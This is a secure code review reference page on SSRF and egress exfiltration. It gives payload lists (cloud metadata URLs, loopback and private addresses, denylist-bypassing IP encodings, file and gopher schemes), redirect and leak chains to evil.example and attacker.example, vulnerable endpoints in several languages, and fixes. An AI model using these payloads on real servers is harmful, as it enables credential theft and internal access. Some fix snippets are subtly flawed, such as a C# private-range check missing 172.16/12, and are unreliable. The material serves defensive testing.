---
title: "4.6 Code Reference — Review SSRF and Egress"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review SSRF and Egress.
---

# 4.6 Code Reference — Review SSRF and Egress

## SSRF {: #ssrf }

From former `4-15-review-ssrf.md`. **Guiding chapter section:** [4.6 - Review SSRF and Egress § SSRF](../../4-06-review-ssrf-and-egress.md#ssrf).

# 4.15 Code Reference — Review SSRF

## Attack Payloads

Use these in authorized tests when a parameter supplies a URL, host, or path segment to an outbound HTTP client. Replace `TARGET` with the vulnerable field.

### Pattern 1: Cloud metadata (link-local)

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/   # Alibaba
```

### Pattern 2: Loopback and internal services

```text
http://127.0.0.1:6379/
http://localhost:8080/admin
http://127.0.0.1:9200/_cat/indices
```

### Pattern 3: Private RFC1918 ranges

```text
http://10.0.0.15/internal/users
http://192.168.1.1/
http://172.16.0.5:8500/v1/agent/self
```

### Pattern 4: Encoded and alternate IP forms (bypass denylists)

```text
http://2130706433/          # decimal 127.0.0.1
http://0x7f000001/
http://127.1/
http://[::1]/
http://0177.0.0.1/
```

### Pattern 5: Non-HTTP schemes and redirects

```text
file:///etc/passwd
gopher://127.0.0.1:6379/_...
# Register https://evil.example → 302 to http://169.254.169.254/
```

## Language-Specific Sinks and Dangerous APIs

Any outbound request built from user input needs allowlisting, DNS rebinding awareness, and post-redirect re-validation.

### Python

```python
import httpx, urllib.request
httpx.Client(follow_redirects=True).get(user_link)
urllib.request.urlopen(preview_target)
requests.post(webhook_url, json={"ping": True})  # when URL is user-supplied
```

Also: `aiohttp` session fetches, `selenium`/`playwright` navigation to user URLs, PDF renderers fetching remote HTML.

### Java

```java
new URL(userUrl).openConnection();
HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(url)).build(), ...);
RestTemplate.getForObject(endpoint, String.class);
```

Apache HttpClient, `URLConnection`, image/PDF libraries that fetch remote resources.

### C#

```csharp
await httpClient.GetAsync(userUrl);
new WebClient().DownloadString(url);
```

`HttpWebRequest`, WCF clients, headless browser automation with user-supplied start URL.

### JavaScript (Node.js)

```javascript
const axios = require('axios');
await axios.get(req.query.url);
await fetch(userUrl);
```

`node-fetch`, `got`, `request`, server-side `puppeteer.goto(url)`.

### Go

```go
http.Get(r.URL.Query().Get("link"))
client.Do(req) // req built from ?link= query param
```

`net/http`, custom TCP dialers, gRPC gateways that proxy to user hostnames.

### Ruby

```ruby
URI.open(params[:url])
Net::HTTP.get(URI(user_url))
```

## Vulnerable Examples in Other Languages

### Java

```java
@GetMapping("/images/thumbnail")
public ResponseEntity<byte[]> thumbnail(@RequestParam String src) throws Exception {
    URL url = new URL(src);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod("GET");
    byte[] body;
    try (InputStream in = conn.getInputStream()) {
        body = in.readAllBytes();
    }
    return ResponseEntity.ok()
        .contentType(MediaType.parseMediaType(conn.getContentType()))
        .body(body);
}
```

### C#

```csharp
[HttpGet("images/thumbnail")]
public async Task<IActionResult> Thumbnail([FromQuery] string src)
{
    using var client = new HttpClient();
    var bytes = await client.GetByteArrayAsync(src);
    return File(bytes, "image/jpeg");
}
```

### Go

```go
func fetchThumbnail(w http.ResponseWriter, r *http.Request) {
    src := r.URL.Query().Get("src")
    resp, err := http.Get(src)
    if err != nil {
        http.Error(w, err.Error(), 500)
        return
    }
    defer resp.Body.Close()
    w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
    io.Copy(w, resp.Body)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Allowlist hosts and block private ranges after DNS resolution. Disable redirects or validate each hop.

```python
import ipaddress
import socket
from urllib.parse import urlparse
import requests

ALLOWED_IMAGE_HOSTS = {"images.example.com", "cdn.partner.com"}

def is_public_ip(hostname: str) -> bool:
    addr = socket.gethostbyname(hostname)
    ip = ipaddress.ip_address(addr)
    return not (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved)

def safe_fetch_image(url: str) -> bytes:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("scheme not allowed")
    if parsed.hostname not in ALLOWED_IMAGE_HOSTS:
        raise ValueError("host not allowlisted")
    if not is_public_ip(parsed.hostname):
        raise ValueError("destination not public")
    resp = requests.get(url, timeout=5, allow_redirects=False)
    resp.raise_for_status()
    return resp.content

@app.route("/images/thumbnail")
def thumbnail():
    return Response(safe_fetch_image(request.args["src"]), mimetype="image/jpeg")
```

**Important:** Wrap fetches in a separate network segment with no internal access when possible. Use IMDSv2 on AWS to reduce metadata abuse.

### Java

Map user choices to predefined base URLs. Resolve DNS and verify the resulting IP is public before connecting.

```java
private static final Map<String, String> ALLOWED = Map.of(
    "logo", "https://cdn.partner.com/assets/logo.png",
    "banner", "https://cdn.partner.com/assets/banner.png");

public byte[] fetchThumbnail(String assetKey) throws Exception {
    String url = ALLOWED.get(assetKey);
    if (url == null) {
        throw new SecurityException("unknown asset");
    }
    URI uri = URI.create(url);
    InetAddress addr = InetAddress.getByName(uri.getHost());
    if (addr.isLoopbackAddress() || addr.isSiteLocalAddress() || addr.isLinkLocalAddress()) {
        throw new SecurityException("blocked destination");
    }
    HttpClient client = HttpClient.newBuilder()
        .followRedirects(HttpClient.Redirect.NEVER)
        .build();
    HttpRequest req = HttpRequest.newBuilder(uri).GET().build();
    return client.send(req, HttpResponse.BodyHandlers.ofByteArray()).body();
}
```

**Important:** Force outbound traffic through a controlled forward proxy when policy allows. Disable redirects or validate each hop.

### C#

Use a custom `DelegatingHandler` that rejects non-public destinations after DNS resolve.

```csharp
public async Task<byte[]> FetchApprovedAsset(string assetId)
{
    var url = _assetCatalog.GetApprovedUrl(assetId);
    if (url is null) throw new SecurityException("unknown asset");

    var host = new Uri(url).Host;
    var addresses = await Dns.GetHostAddressesAsync(host);
    foreach (var addr in addresses)
    {
        if (IPAddress.IsLoopback(addr) || IsPrivate(addr))
            throw new SecurityException("blocked destination");
    }

    using var client = new HttpClient(new SsrSafeHandler()) { Timeout = TimeSpan.FromSeconds(5) };
    return await client.GetByteArrayAsync(url);
}

private static bool IsPrivate(IPAddress ip) =>
    ip.ToString().StartsWith("10.") || ip.ToString().StartsWith("192.168.");
```

**Important:** Store resource IDs and fetch from trusted internal catalogs instead of raw user URLs in production.

### Go

Custom `Transport.DialContext` refuses private IPs. Allowlist permitted webhook hosts.

```go
var allowedImageHosts = map[string]bool{"images.example.com": true, "cdn.partner.com": true}

func safeFetchThumbnail(raw string) ([]byte, error) {
    u, err := url.Parse(raw)
    if err != nil || u.Scheme != "https" || !allowedImageHosts[u.Hostname()] {
        return nil, fmt.Errorf("url not allowed")
    }
    addrs, err := net.LookupHost(u.Hostname())
    if err != nil {
        return nil, err
    }
    for _, a := range addrs {
        ip := net.ParseIP(a)
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
            return nil, fmt.Errorf("blocked destination")
        }
    }
    client := &http.Client{
        Timeout: 5 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
    resp, err := client.Get(u.String())
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}
```

**Important:** Cap response body size to reduce blind data exfiltration. Route outbound HTTP through policy-enforcing sidecars.

## Internal and egress exfiltration {: #egress }

From former `4-25-review-internal-and-egress-exfiltration.md`. **Guiding chapter section:** [4.6 - Review SSRF and Egress § Internal and egress exfiltration](../../4-06-review-ssrf-and-egress.md#egress).

# 4.25 Code Reference — Review Internal and Egress Exfiltration

## Attack Payloads

Use these in authorized tests against URL fetchers, webhooks, and import-from-URL features. Confirm which networks and protocols the server process may reach.

### Pattern 1: Loopback and localhost (SSRF abuse scenario)

```text
http://127.0.0.1/admin
http://localhost:8080/actuator/health
http://[::1]/internal/
http://127.1/
```

### Pattern 2: Cloud metadata

```text
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Pattern 3: Private RFC1918 ranges

```text
http://10.0.0.15:9200/
http://192.168.1.1/
http://172.16.0.5/internal-api/users
```

### Pattern 4: Alternate IP encodings and DNS rebinding

```text
http://2130706433/          # decimal 127.0.0.1
http://0x7f000001/
http://attacker-controlled.example  # resolves to 127.0.0.1 after TTL
```

### Pattern 5: Non-HTTP schemes and file reads

```text
file:///etc/passwd
file:///c:/windows/win.ini
gopher://internal:70/
```

### Pattern 6: Open redirect and egress exfiltration chains

```text
https://public.example/redirect?next=http://169.254.169.254/
http://internal.service/ → 302 Location: http://attacker.example/?leak=
```

## Language-Specific Sinks and Dangerous APIs

Any server-side HTTP client that accepts a user-influenced URL or host is a review priority.

### Python

```python
urllib.request.urlopen(body["callback_url"])
async with aiohttp.ClientSession() as s:
    await s.get(webhook_target, allow_redirects=True)
requests.post(import_src, data=form)  # when import_src is user JSON field
```

`aiohttp`, `selenium` with user URLs, PDF renderers that fetch remote assets.

### Java

```java
new URL(userUrl).openStream();
HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(url)).build(), ...);
RestTemplate.getForObject(userUrl, String.class);
```

Apache `HttpClient`, `ImageIO.read(new URL(url))`, SSRF in SAML/OIDC metadata fetchers.

### C#

```csharp
await httpClient.GetAsync(userUrl);
await new HttpClient().GetStringAsync(previewUrl);
WebClient.DownloadString(imageUrl);
```

### JavaScript (Node.js)

```javascript
const res = await fetch(req.body.callbackUrl);
axios.post(req.body.webhook, { ping: true });
https.get(userProvidedHost, (r) => { ... });
```

### Go

```go
resp, err := http.PostForm(r.FormValue("callback_url"), nil)
client.Get(r.URL.Query().Get("fetch"))
```

### Shell and integration scripts

```bash
curl "$USER_URL"
wget -O- "$WEBHOOK"
```

## Vulnerable Examples in Other Languages

### Java

```java
@GetMapping("/internal/proxy")
public void proxy(@RequestParam String path, HttpServletResponse resp) throws IOException {
    URL url = new URL("http://127.0.0.1" + path);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    IOUtils.copy(conn.getInputStream(), resp.getOutputStream());
}

@PostMapping("/webhooks/test")
public String testWebhook(@RequestBody Map<String, String> body) throws IOException {
    String callback = body.get("callbackUrl");
    HttpURLConnection conn = (HttpURLConnection) new URL(callback).openConnection();
    conn.setRequestMethod("POST");
    return new String(conn.getInputStream().readAllBytes());
}
```

### C#

```csharp
[HttpGet("preview")]
public async Task<IActionResult> Preview([FromQuery] string url)
{
    using var client = new HttpClient();
    var html = await client.GetStringAsync(url);
    return Content(html, "text/html");
}

[HttpPost("import-from-url")]
public async Task<IActionResult> Import([FromBody] ImportRequest req)
{
    using var client = new HttpClient();
    var bytes = await client.GetByteArrayAsync(req.SourceUrl);
    await _storage.SaveAsync(req.DestinationKey, bytes);
    return Ok();
}
```

### Go

```go
func webhookTest(w http.ResponseWriter, r *http.Request) {
    var body struct {
        CallbackURL string `json:"callback_url"`
    }
    json.NewDecoder(r.Body).Decode(&body)
    resp, err := http.Get(body.CallbackURL)
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadGateway)
        return
    }
    defer resp.Body.Close()
    io.Copy(w, resp.Body)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Validate scheme, host, and port against an allowlist. Resolve DNS and block private IP ranges before connecting. Limit redirects and response size.

```python
import ipaddress
import socket
from urllib.parse import urlparse

import requests
from flask import Flask, abort, request

ALLOWED_HOSTS = {"cdn.example.com", "images.example.com"}
BLOCKED_NETS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def safe_fetch(url: str) -> bytes:
    parsed = urlparse(url)
    if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("URL not allowed")
    for info in socket.getaddrinfo(parsed.hostname, parsed.port or 443):
        addr = ipaddress.ip_address(info[4][0])
        if any(addr in net for net in BLOCKED_NETS):
            raise ValueError("blocked address")
    resp = requests.get(url, timeout=5, allow_redirects=False, stream=True)
    resp.raise_for_status()
    chunk = next(resp.iter_content(8192))
    return chunk

@app.route("/integrations/webhook-test")
def webhook_test():
    try:
        data = safe_fetch(request.json["callback_url"])
    except ValueError:
        abort(400)
    return data, 200, {"Content-Type": "application/octet-stream"}
```

**Important:** Pass opaque server-side IDs to background jobs instead of raw user URLs when possible.

### Java

Use an allowlist. Disable redirects. Verify resolved IP after DNS.

```java
import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse.Redirect;

private static final Set<String> ALLOWED_HOSTS = Set.of("cdn.example.com");

public byte[] safeFetch(String urlString) throws Exception {
    URI uri = URI.create(urlString);
    if (!"https".equals(uri.getScheme()) || !ALLOWED_HOSTS.contains(uri.getHost())) {
        throw new IllegalArgumentException("URL not allowed");
    }
    for (InetAddress addr : InetAddress.getAllByName(uri.getHost())) {
        if (addr.isLoopbackAddress() || addr.isLinkLocalAddress() || addr.isSiteLocalAddress()) {
            throw new IllegalArgumentException("blocked address");
        }
    }
    HttpClient client = HttpClient.newBuilder()
        .followRedirects(Redirect.NEVER)
        .connectTimeout(Duration.ofSeconds(5))
        .build();
    HttpRequest req = HttpRequest.newBuilder(uri).GET().build();
    return client.send(req, HttpResponse.BodyHandlers.ofByteArray()).body();
}
```

### C#

Bind named `HttpClient` instances to known base addresses. Validate host before `GetAsync`.

```csharp
private static readonly HashSet<string> AllowedHosts = new() { "cdn.example.com" };

private static bool IsBlocked(IPAddress addr) =>
    IPAddress.IsLoopback(addr) ||
    addr.Equals(IPAddress.Parse("169.254.169.254")) ||
    (addr.IsIPv4 && (
        addr.GetAddressBytes()[0] == 10 ||
        (addr.GetAddressBytes()[0] == 172 && addr.GetAddressBytes()[1] >= 16) ||
        (addr.GetAddressBytes()[0] == 192 && addr.GetAddressBytes()[1] == 168)));

public async Task<byte[]> SafeFetchAsync(string url, IHttpClientFactory factory)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
        throw new ArgumentException("Invalid URL");
    if (uri.Scheme != Uri.UriSchemeHttps || !AllowedHosts.Contains(uri.Host))
        throw new ArgumentException("URL not allowed");
    foreach (var addr in await Dns.GetHostAddressesAsync(uri.Host))
    {
        if (IsBlocked(addr))
            throw new ArgumentException("blocked address");
    }
    var client = factory.CreateClient("AllowlistedCdn");
    return await client.GetByteArrayAsync(uri);
}
```

### Go

Parse URL, allowlist host, and use a custom dialer that refuses private IPs.

```go
func safeFetch(raw string) ([]byte, error) {
    u, err := url.Parse(raw)
    if err != nil || u.Scheme != "https" || u.Hostname() != "cdn.example.com" {
        return nil, fmt.Errorf("URL not allowed")
    }
    addrs, err := net.LookupIP(u.Hostname())
    if err != nil {
        return nil, err
    }
    for _, addr := range addrs {
        if addr.IsLoopback() || addr.IsPrivate() || addr.IsLinkLocalUnicast() {
            return nil, fmt.Errorf("blocked address")
        }
    }
    client := &http.Client{
        Timeout: 5 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
    resp, err := client.Get(u.String())
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}
```

